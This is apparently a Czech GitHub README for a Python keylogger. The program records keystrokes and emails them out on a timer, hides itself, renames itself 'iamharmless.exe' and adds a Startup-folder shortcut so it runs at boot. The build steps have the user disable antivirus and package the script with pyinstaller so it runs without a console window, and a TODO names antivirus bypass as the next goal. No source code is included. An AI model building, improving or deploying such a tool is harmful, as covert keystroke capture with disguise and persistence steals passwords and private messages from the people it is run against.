# Odchytávač kláves - Keylogger

Aplikace pro "odchytávání" stisknutých kláves a jejich odesílání přes email

## Vlastnosti programu:

- Ze skriptu lze vytvořit spustitelný exe soubor (viz soubor pyTOexe.txt)
- Po spuštění programu se odchytávač skryje, přesune a přejmenuje
- Ve složce "Po spuštění" se vytvoří zástupce programu
  - Ochytávač se automaticky spustí při zapnutí počítače
 #
- Program zaznamenává stisknuté klávesy
- Formátuje je do čitelnější podoby
- Ve stanoveném časovém intervalu odesílá stisknuté klávesy na email

## Návod na vytvoření .exe souboru pomocí pyinstaller:

- Nainstalovat pyinstaller příkazem "pip install pyinstaller"
1) Vypnout antivirus nebo nastavit příslušné složky do Vyloučení
2) Otevřít CMD ve složce se skriptem
3) pyinstaller -w -F -i [icon file] [python file]
	- -w nespustí při zapnutí terminál
	- -F schová všechny potřebné soubory do .exe souboru
	- -i umožňuje přidání ikony

Po spuštění programu se odchytávač skryje, přesune do složky:  
C:\\Users\\{username}\\AppData\\  
přejmenuje se na "iamharmless.exe" a vytvoří zástupce se jménem "harmless" ve složce:  
C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\  
(složka Po spuštění - Start -> Win+r -> shell:startup)

Odchytávač lze vypnout přes Správce úloh

## TODO:

- Obejít antivirus (program funguje jen s vypnutým antivirem)

#
Autor: [@jakubferet](https://github.com/jakubferet)
